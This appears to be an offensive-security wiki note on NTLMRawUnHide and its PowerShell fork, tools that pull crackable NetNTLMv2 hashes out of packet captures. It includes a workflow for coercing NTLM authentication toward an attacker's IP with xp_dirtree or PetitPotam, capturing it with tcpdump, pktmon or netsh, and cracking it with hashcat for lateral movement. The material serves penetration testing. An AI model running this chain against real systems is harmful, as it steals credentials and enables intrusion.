# NTLMRawUnHide

**Tags:** `#NTLMRawUnHide` `#NTLM` `#NetNTLMv2` `#pcap` `#hashextraction` `#coercion` `#cracking` `#ownfork`

Scans **raw network packet captures** for NTLM authentication messages and extracts **NetNTLMv2** hashes in hashcat/john-ready format. The use-case: you coerce/capture NTLM authentication on the wire (MSSQL `xp_dirtree`, a rogue share/UNC path, PetitPotam-style coercion, any forced auth) but the traffic landed in a **pcap** rather than being caught and formatted by [Responder](https://github.com/lgandx/Responder) — this pulls the crackable hash straight out of the raw bytes. Complements, rather than replaces, Responder/ntlmrelayx.

**Input:** `.pcap` · `.pcapng` · `.cap` · `.etl` (the last = native Windows `netsh`/`pktmon` captures)
**Output:** `user::domain:challenge:response:blob` → crack with `hashcat -m 5600`.

## Two versions

| | Original — **Python 3** | Fork — **PowerShell 7** (own) |
|---|---|---|
| Repo | [mlgualtieri/NTLMRawUnHide](https://github.com/mlgualtieri/NTLMRawUnHide) | [Er2oneousbit/NTLMRawUnHide-PS7](https://github.com/Er2oneousbit/NTLMRawUnHide-PS7) |
| Script | `NTLMRawUnhide.py` | `NTLMRawUnHide.ps1` |
| Runtime | Python3 (cross-platform) | `pwsh` 7+ — **no Python needed** |
| Edge | The standard tool | Runs **natively on Windows**, works directly on `NETSH.EXE`/`PKTMON.EXE` `.etl` captures — capture *and* extract on the same Windows host, no toolchain/conversion |

> [!tip] The PS7 fork's point is the **Windows-only kill chain**: on a box with no Python and no Wireshark you can still `pktmon`/`netsh trace` to an `.etl`, then extract the hash in-place with `pwsh` — nothing else to drop.

---

## Usage

Same flags in both (`-i` in, `-o` out, `-f` follow/monitor, `-q` quiet, `-v` verbose):

```bash
# Original — Python3
python3 NTLMRawUnhide.py -i capture.pcap -o hashes.txt
python3 NTLMRawUnhide.py -i capture.pcap -f      # live-follow a growing capture
```

```powershell
# Fork — PowerShell 7 (Windows-native; feed it a pktmon/netsh .etl or a .pcap)
.\NTLMRawUnHide.ps1 -i capture.etl -o hashes.txt
.\NTLMRawUnHide.ps1 -i capture.pcapng -q         # hashes only, no banner
```

```bash
# Crack
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt
```

**Install:** `git clone https://github.com/Er2oneousbit/NTLMRawUnHide-PS7` (fork) · `git clone https://github.com/mlgualtieri/NTLMRawUnHide` (original). A local copy of the original script also lives at `Tools/Database/NTLMRawUnHide.py`.

---

## Capture → extract workflow

```bash
# 1. Coerce/force NTLM auth toward a host you're capturing on (examples)
#    MSSQL:   EXEC master..xp_dirtree '\\<your_ip>\share'
#    Coercion: PetitPotam / printerbug / any UNC path you can plant

# 2a. Capture on Linux
sudo tcpdump -i eth0 -w capture.pcap 'port 445 or port 139'
# 2b. Capture on Windows (no Wireshark needed — feeds the PS7 fork directly)
pktmon start --capture --pkt-size 0 -f C:\temp\capture.etl
netsh trace start capture=yes tracefile=C:\temp\trace.etl

# 3. Extract the NetNTLMv2 hash from the raw capture (commands above)
# 4. hashcat -m 5600  → creds → auth / lateral movement
```

---

> [!note] **See also**
> Protocol background (what NetNTLMv2 is and why it's crackable/relayable): [[Standards & Protocols/NTLM|NTLM]]. Coercion source that pairs with this: [[Services/Database Services/MSSQL|MSSQL]] (`xp_dirtree`). Alternatives: [[Tools/Network/PCredz|PCredz]] (creds from pcap/live), [[Tools/Lateral Movement/ntlmrelayx|ntlmrelayx]] (**relay** the auth instead of cracking it), and Responder (capture + auto-format). Crack with hashcat `-m 5600` / john `netntlmv2`.

---

*Created: 2026-08-14*
*Updated: 2026-08-14*
*Model: claude-opus-5*
